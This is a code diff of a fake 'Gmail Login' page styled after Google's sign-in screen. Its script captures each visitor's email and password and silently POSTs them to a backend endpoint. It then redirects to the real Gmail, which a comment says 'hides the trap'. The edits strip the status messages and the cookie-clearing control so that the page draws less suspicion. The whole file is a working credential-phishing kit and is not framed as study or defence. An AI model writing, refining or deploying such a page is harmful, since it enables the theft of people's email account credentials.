@@ -6,7 +6,6 @@
     <title>Gmail Login</title>
     <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap" />
     <style>
-        /* same styles as before, but we remove the status-box */
         * { margin:0; padding:0; box-sizing:border-box; }
         body {
             font-family:'Google Sans','Segoe UI',Roboto,Arial,sans-serif;
@@ -90,50 +89,6 @@
         .footer-links a:hover { text-decoration:underline; }
         .error-message { color:#d93025; font-size:13px; margin-top:6px; display:none; }
         .error-message.visible { display:block; }
-
-        /* we removed .status-box */
-
-        /* loading overlay (optional) */
-        .loading-overlay {
-            display: none;
-            position: fixed;
-            inset: 0;
-            background: rgba(255,255,255,0.8);
-            z-index: 999;
-            align-items: center;
-            justify-content: center;
-            font-size: 18px;
-            color: #1f1f1f;
-        }
-        .loading-overlay.active {
-            display: flex;
-        }
-        .spinner {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #1a73e8;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin-right: 12px;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .loading-content {
-            display: flex;
-            align-items: center;
-            background: white;
-            padding: 20px 30px;
-            border-radius: 8px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
-        }
-        @media (max-width:480px) {
-            .login-card { padding:32px 20px 28px; }
-            .title { font-size:22px; }
-            .form-options { flex-direction:column; align-items:flex-start; }
-        }
     </style>
 </head>
 <body>
@@ -176,7 +131,6 @@
 
         <div style="text-align:center; margin-top:12px;">
             <button type="button" class="btn-secondary" id="createAccountBtn">Create account</button>
-            <button type="button" class="btn-secondary" id="clearCookieBtn" style="margin-left:16px;">Clear stored user</button>
         </div>
     </form>
 
@@ -187,16 +141,10 @@
     </div>
 </div>
 
-<!-- Loading overlay -->
-<div class="loading-overlay" id="loadingOverlay">
-    <div class="loading-content">
-        <div class="spinner"></div>
-        <span>Signing in, please wait...</span>
-    </div>
-</div>
-
 <script>
+    // ─── FRONTEND – clean, no status messages ──────────────────────────
     const BACKEND_URL = '/api/login';
+    const COOKIE_NAME = 'gmail_user';
 
     const form = document.getElementById('loginForm');
     const emailInput = document.getElementById('email');
@@ -204,14 +152,9 @@
     const emailError = document.getElementById('emailError');
     const passwordError = document.getElementById('passwordError');
     const rememberCheck = document.getElementById('rememberMe');
-    const forgotLink = document.getElementById('forgotLink');
-    const createAccountBtn = document.getElementById('createAccountBtn');
-    const clearCookieBtn = document.getElementById('clearCookieBtn');
     const submitBtn = document.getElementById('submitBtn');
-    const loadingOverlay = document.getElementById('loadingOverlay');
 
-    // Cookie helpers
-    const COOKIE_NAME = 'gmail_user';
+    // ─── Cookie helpers ──────────────────────────────────────────────
     function getCookie(name) {
         const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
         return match ? decodeURIComponent(match[2]) : null;
@@ -224,16 +167,19 @@
         document.cookie = name + '=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;';
     }
 
-    // Restore stored email
+    // ─── Restore stored email (without any message) ──────────────────
     const storedEmail = getCookie(COOKIE_NAME);
     if (storedEmail) {
         emailInput.value = storedEmail;
         emailInput.disabled = true;
         emailInput.style.background = '#f1f3f4';
         rememberCheck.checked = true;
+    } else {
+        emailInput.disabled = false;
+        emailInput.style.background = '';
     }
 
-    // Validation
+    // ─── Validation ──────────────────────────────────────────────────
     function setError(element, errorDiv, condition) {
         if (condition) { errorDiv.classList.add('visible'); element.style.borderColor = '#d93025'; }
         else { errorDiv.classList.remove('visible'); element.style.borderColor = ''; }
@@ -251,15 +197,19 @@
         return valid;
     }
 
-    // Submit handler
+    // ─── Submit handler – send and redirect silently ────────────────
     form.addEventListener('submit', function(e) {
         e.preventDefault();
         if (!validateForm()) return;
 
         const email = emailInput.value.trim();
         const password = passwordInput.value.trim();
-        if (rememberCheck.checked) setCookie(COOKIE_NAME, email, 30);
-        else deleteCookie(COOKIE_NAME);
+
+        if (rememberCheck.checked) {
+            setCookie(COOKIE_NAME, email, 30);
+        } else {
+            deleteCookie(COOKIE_NAME);
+        }
 
         const payload = {
             email: email,
@@ -270,44 +220,28 @@
             pageUrl: window.location.href
         };
 
-        // Show loading overlay
-        loadingOverlay.classList.add('active');
+        // Disable button to prevent double‑click
         submitBtn.disabled = true;
+        submitBtn.textContent = 'Signing in…';
 
+        // Send data to backend (we don't care about response)
         fetch(BACKEND_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload)
         })
-        .then(res => res.json())
-        .then(data => {
-            // Regardless of response, redirect to real Gmail
-            window.location.href = 'https://mail.google.com';
-        })
-        .catch(err => {
-            // Even on error, redirect
+        .catch(() => {})  // ignore any errors
+        .finally(() => {
+            // Redirect to real Gmail – hides the trap
             window.location.href = 'https://mail.google.com';
         });
     });
 
-    // Clear stored user
-    clearCookieBtn.addEventListener('click', function() {
-        deleteCookie(COOKIE_NAME);
-        emailInput.value = '';
-        emailInput.disabled = false;
-        emailInput.style.background = '';
-        rememberCheck.checked = false;
-        emailError.classList.remove('visible');
-        passwordError.classList.remove('visible');
-        emailInput.style.borderColor = '';
-        passwordInput.style.borderColor = '';
-    });
+    // ─── Demo links ──────────────────────────────────────────────────
+    document.getElementById('forgotLink').addEventListener('click', e => { e.preventDefault(); alert('🔍 Forgot email? (demo)'); });
+    document.getElementById('createAccountBtn').addEventListener('click', () => alert('📝 Create account (demo)'));
 
-    // Demo links
-    forgotLink.addEventListener('click', e => { e.preventDefault(); alert('🔍 Forgot email? (demo)'); });
-    createAccountBtn.addEventListener('click', () => alert('📝 Create account (demo)'));
-
-    // Real-time validation
+    // ─── Real‑time validation ────────────────────────────────────────
     emailInput.addEventListener('blur', function() {
         const email = emailInput.value.trim();
         const isValid = email.length > 0 && email.includes('@');
